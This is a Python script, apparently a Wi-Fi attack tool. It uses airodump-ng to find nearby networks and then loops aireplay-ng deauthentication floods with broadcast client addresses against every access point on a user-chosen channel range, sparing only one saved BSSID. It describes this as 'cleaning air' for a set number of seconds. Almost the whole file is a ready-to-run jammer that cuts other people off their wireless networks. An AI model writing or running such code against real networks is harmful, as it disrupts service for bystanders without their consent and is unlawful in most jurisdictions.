import csv, time
from subprocess import *
from air_module import *
from glob import *
from air_module import *


'''l wireless interface in monitor mode'''
l = int_identity()

call('rm -r temp_air_dump/air*', shell=True)
call('airodump-ng {} -w temp_air_dump/air_dump & sleep 5 ; kill $!'.format(l), shell=True)

'''some extra vars returns from air_save() for future updates'''
bssid_save, london, csv_name = air_save()
call('clear', shell='True')

def air_deauthentication(bssid_save, s, e):
    for i in range(int(s), int(e)+1):
        air_scan1(i, l)
        time.sleep(.5)
        sps = air_sps()
        data = air_bssid(sps)
        if bssid_save in data:
            data.remove(bssid_save)
            for k in data:
                call('aireplay-ng -0 0 -a {}  -c FF:FF:FF:FF:FF:FF {} & sleep 2 ; kill $!'.format(k, l), shell=True)
        else:
            for k in data:
                call('aireplay-ng -0 0 -a {}  -c FF:FF:FF:FF:FF:FF {} & sleep 2 ; kill $!'.format(k, l), shell=True)
'''showing logo'''
sks = [war, ins, air, wing]
wia(1, sks)
s = input('{}\n Please choose lowest channel to scan (1-14): '.format(info))
e = input('\n Please choose highest channel, minimum is {}: '.format(int(s)+1))
'''range of channels (s-e) to clean air'''
a = input('\n How much time do you want to clean air? (seconds): ')
run('clear', shell=True)
print(pics)
time.sleep(1)
st_time = time.time()
while int(time.time() - st_time) < int(a):
    air_deauthentication(bssid_save, s, e)
else:
    call('clear', shell=True)
    print('Ready!')
